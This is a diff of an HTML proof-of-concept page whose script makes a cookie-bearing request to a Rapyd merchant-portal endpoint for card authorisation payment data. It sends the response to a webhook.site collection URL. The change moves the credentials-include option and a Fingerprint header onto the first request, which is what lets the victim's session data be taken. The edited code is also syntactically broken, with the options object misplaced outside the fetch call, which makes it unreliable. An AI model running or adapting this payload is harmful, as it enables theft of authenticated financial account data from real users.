@@ -1,7 +1,12 @@
 <html>
   <body>
     <script>
-      fetch("https://dashboard.rapyd.net/v1/merchants-portal/protect/elements?action_type=card_auth_payment") // No credentials here
+      fetch("https://dashboard.rapyd.net/v1/merchants-portal/protect/elements?action_type=card_auth_payment"), {
+  credentials: "include",
+        headers: {
+              "Fingerprint": "e6d9d6ed229ef340ef7f2a96d5d14de1"
+            },
+}
         .then(res => res.text())
         .then(data => {
           fetch("https://webhook.site/270a7384-2104-4312-b651-22c65840af6a", {
@@ -9,9 +14,8 @@
             body: data,
             headers: {
               "Content-Type": "text/plain",
-              "Fingerprint": "e6d9d6ed229ef340ef7f2a96d5d14de1"
             },
-            credentials: "include"  // Cookies sent only in this request
+             // Cookies sent only in this request
           });
         });
     </script>
